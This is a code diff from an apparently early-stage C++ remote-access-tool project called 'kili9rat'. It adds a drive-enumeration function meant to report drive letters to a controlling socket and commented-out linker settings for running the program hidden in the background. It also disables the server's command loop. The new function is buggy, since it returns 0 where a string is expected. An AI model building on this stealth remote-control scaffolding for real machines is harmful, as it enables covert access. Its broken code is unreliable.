@@ -5,17 +5,37 @@
 #include "framework.h"
 #include "kili9rat.h"
 #include "ServerSocket.h"
+#include <direct.h>
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #endif
 
+//#pragma comment (linker, "/subsystem;windows /entry:WinMainCRTStartup") //子系统 入口函数
+//#pragma comment (linker, "/subsystem;windows /entry:mainCRTStartup") //调用main函数
+//#pragma comment (linker, "/subsystem;console /entry:mianCRTStartup") //纯后台
+//#pragma comment (linker, "/subsystem;console /entry:WinMainCRTStartup")
 
 // 唯一的应用程序对象
 
 CWinApp theApp;
 
 using namespace std;
+
+//获取磁盘分区信息
+std::string MakeDriverInfo()
+{
+    std::string result;
+    for (int i = 1; i <= 26; i++) {
+        if (_chdrive(i) == 0) {
+            if (result.size() > 0) result += ',';
+            result += 'A' + i - 1;
+        }
+    }
+    //发送命令 需要先封包CPacket封解包
+    //CServerSocket::getInstance()->Send(CPacket());
+    return 0;
+}
 
 int main()
 {
@@ -47,25 +67,27 @@ int main()
             //程序初始化就初始化 销毁就销毁
             //静态变量（首次被调用会初始化 一定是程序销毁才会销毁），全局静态变量在main被调用前会初始化 main结束会被析构
             //pserver(服务器创建单例) > InitSocket(初始化套接字) > AccepClient(获取客服端) > DealCommand(处理命令)
-            CServerSocket* pserver = CServerSocket::getInstance();
-            int count = 0;
-            if (pserver->InitSocket() == false) {
-                MessageBox(NULL, _T("网络初始化异常未能成功初始化，请检查网络状态"), _T("网络初始化失败"), MB_OK | MB_ICONERROR);
-                exit(0);
-            }
-            while (CServerSocket::getInstance() != NULL) {
-                if (pserver->AccepClient() == false) {
-                    if (count >= 3) {
-                        MessageBox(NULL, _T("多次重试无非正常接入网络，结束程序!"), _T("接入用户失败"), MB_OK | MB_ICONERROR);
-                        exit(0);
-                    }
-                    MessageBox(NULL, _T("无非正常接入网络，自动重试"), _T("接入用户失败"), MB_OK | MB_ICONERROR);
-                    count++;
-                }
-                int ret = pserver->DealCommand();
-                //TODO
+            //CServerSocket* pserver = CServerSocket::getInstance();
+            //int count = 0;
+            //if (pserver->InitSocket() == false) {
+            //    MessageBox(NULL, _T("网络初始化异常未能成功初始化，请检查网络状态"), _T("网络初始化失败"), MB_OK | MB_ICONERROR);
+            //    exit(0);
+            //}
+            //while (CServerSocket::getInstance() != NULL) {
+            //    if (pserver->AccepClient() == false) {
+            //        if (count >= 3) {
+            //            MessageBox(NULL, _T("多次重试无非正常接入网络，结束程序!"), _T("接入用户失败"), MB_OK | MB_ICONERROR);
+            //            exit(0);
+            //        }
+            //        MessageBox(NULL, _T("无非正常接入网络，自动重试"), _T("接入用户失败"), MB_OK | MB_ICONERROR);
+            //        count++;
+            //    }
+            //    int ret = pserver->DealCommand();
+            //    //TODO
+            //}
 
-            }
+
+
 
         }
     }
